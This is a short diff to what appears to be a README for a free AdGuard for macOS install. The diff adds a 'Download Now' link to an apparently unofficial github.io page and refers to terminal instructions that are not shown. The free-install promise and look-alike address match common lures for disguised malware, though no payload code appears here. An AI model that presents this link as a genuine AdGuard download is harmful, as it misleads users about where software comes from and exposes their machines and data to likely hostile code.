@@ -2,7 +2,7 @@
 
 AdGuard is a powerful ad-blocking and privacy protection tool designed for macOS. Follow the instructions below to install AdGuard for free and enjoy a cleaner, safer browsing experience! 😊
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://adguard-for-mac.github.io/.github/)
 
 If the download button doesn’t work, follow the step-by-step terminal instructions below.
 
